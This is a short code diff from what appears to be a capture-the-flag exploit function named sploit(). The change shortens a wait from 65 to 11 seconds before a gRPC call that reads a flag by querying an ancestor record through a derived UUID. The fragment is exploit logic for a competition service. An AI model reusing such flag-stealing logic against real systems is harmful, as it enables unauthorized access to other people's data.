@@ -55,7 +55,7 @@ def sploit():
             pass
 
         # wait for ancestors list transfer to redis
-        time.sleep(65)
+        time.sleep(11)
 
         # now we have "reverse" of "reverse" uuid => uuid of flag, so we can see burial place of ancestor
         ancestor: AncestorData = ancestor_stub.GetAncestor(GetAncestorRequest(id=PUBLIC_FLAG_ID), metadata=metadata)
